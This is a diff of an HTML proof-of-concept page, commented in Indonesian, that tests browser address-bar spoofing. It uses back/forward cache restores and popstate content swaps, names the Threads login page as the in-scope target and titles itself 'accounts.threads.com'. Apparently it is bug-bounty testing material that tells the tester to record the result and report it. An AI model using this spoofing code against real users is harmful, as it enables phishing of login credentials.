@@ -1,11 +1,40 @@
-<!doctype html><meta charset=utf-8>
-<!-- PREDIKAT: selagi dialog terbuka, bar SUDAH google.com; tekan "Stay" -> apakah tetap?
-     ORACLE: screenshot (a) saat dialog terbuka (b) 3 detik setelah Stay
-     EXPECTED-SECURE: bar = URL nyata di KEDUA momen -->
-<button onclick="go()">go</button>
-<pre id=p></pre>
+<!DOCTYPE html>
+<!-- ADVANCED SPOOF #4 — BFCACHE / BACK-FORWARD URL<->CONTENT DESYNC
+     Fix-point: transisi back/forward memulihkan dokumen penyerang dari bfcache SEMENTARA bilah alamat
+     sudah/masih menampilkan URL target selama jendela transisi. UNIK: bukan navigasi maju (beda #2/#4),
+     melainkan restore history. Juga uji same-document popstate content-swap. -->
+<html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>accounts.threads.com</title>
+<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:26px;max-width:680px}
+h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px;word-break:break-all}
+label{font-size:13px;color:#57606a}input{width:100%;padding:8px;border:1px solid #d0d7de;border-radius:6px;font-size:13px;margin:4px 0 12px}
+.step{border-left:3px solid #1a73e8;padding:4px 12px;margin:8px 0;font-size:13px;color:#444}
+button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600;margin:6px 6px 0 0}
+#stage{margin-top:16px;border:1px dashed #d0d7de;border-radius:8px;padding:16px;color:#5f6368}
+.warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}</style></head>
+<body>
+<h1>Advanced Spoof #4 — bfcache / Back-Forward Desync</h1>
+<p>Dua lengan uji. A) same-document: push URL "target" lalu swap konten via popstate. B) cross-doc bfcache: pergi ke target lalu tekan BACK — amati apakah bilah alamat sempat menampilkan target saat konten penyerang pulih dari cache.</p>
+
+<label>Target korban (in-scope)</label>
+<input id="target" value="https://www.threads.com/login">
+
+<div class="step"><b>Lengan A</b> (same-document popstate):</div>
+<button onclick="armA()">▶ A: push "target-path" + siapkan swap</button>
+<button onclick="history.back()">↩ tekan Back (picu popstate)</button>
+
+<div class="step"><b>Lengan B</b> (cross-doc bfcache): klik → di target tekan tombol Back browser.</div>
+<button onclick="armB()">▶ B: pergi ke target (lalu Back manual)</button>
+
+<div id="stage">Panggung konten. Perhatikan sinkron/tidaknya bilah alamat ⟷ area ini saat transisi.</div>
+<div class="warn">Vulnerable bila selama transisi bilah alamat = URL target sementara area di atas = konten penyerang. Rekam (video lebih baik dari screenshot untuk transisi) → STOP → lapor.</div>
 <script>
-addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
-function go(){ location.href = 'https://www.google.com/'; }
-p.textContent = 'REAL: ' + location.href;
-</script>
+const stage=document.getElementById('stage');
+function armA(){
+  history.pushState({poc:1},'','/accounts/threads/login/verify');
+  stage.innerHTML='<b style="color:#188038">State di-push.</b> Sekarang tekan Back → popstate akan swap konten sementara URL bergeser.';
+  window.onpopstate=()=>{stage.innerHTML='<b style="color:#b00020">POC konten penyerang</b> — cek: bilah alamat sudah berubah tapi area ini konten kita?';};
+}
+function armB(){location.href=document.getElementById('target').value;}
+window.addEventListener('pageshow',e=>{if(e.persisted){stage.innerHTML='<b style="color:#b00020">Dipulihkan dari bfcache</b> — halaman penyerang hidup lagi. Cek jendela transisi bilah alamat.';}});
+</script></body></html>
